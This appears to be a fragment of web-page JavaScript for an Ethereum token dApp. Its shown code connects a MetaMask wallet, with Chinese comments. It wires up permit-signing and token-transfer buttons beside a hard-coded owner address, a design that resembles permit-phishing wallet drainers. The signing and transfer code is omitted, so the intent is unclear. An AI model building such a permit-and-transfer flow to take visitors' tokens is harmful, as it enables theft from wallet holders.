const contractAddress = '0x2E9d30761DB97706C536A112B9466433032b28e3'; // 合约地址
const ownerAddress = '0xA465E2fc9F9D527AAEb07579E821D461F700e699'; // Owner 地址

let web3;
let contract;
let userAccount;

const contractABI = [
    // ... ABI 和之前一样 ...
];

document.addEventListener("DOMContentLoaded", function() {
    console.log("Document loaded");
    document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
    document.getElementById('signPermitBtn').addEventListener('click', signPermit);
    document.getElementById('transferTokensBtn').addEventListener('click', transferTokens);
});

async function connectWallet() {
    console.log("Connecting to wallet...");
    if (window.ethereum) {
        try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            contract = new web3.eth.Contract(contractABI, contractAddress);
            userAccount = accounts[0];
            document.getElementById('walletAddress').innerText = `Connected: ${userAccount}`;
            document.getElementById('signPermitBtn').disabled = false; // 启用签名按钮
            console.log("Wallet connected:", userAccount);
            alert("钱包已连接!");
        } catch (error) {
            console.error("Error connecting to wallet:", error);
            alert("连接钱包时出错: " + error.message);
        }
    } else {
        alert("请安装 MetaMask!");
    }
}

// 其他功能（signPermit 和 transferTokens）保持不变...

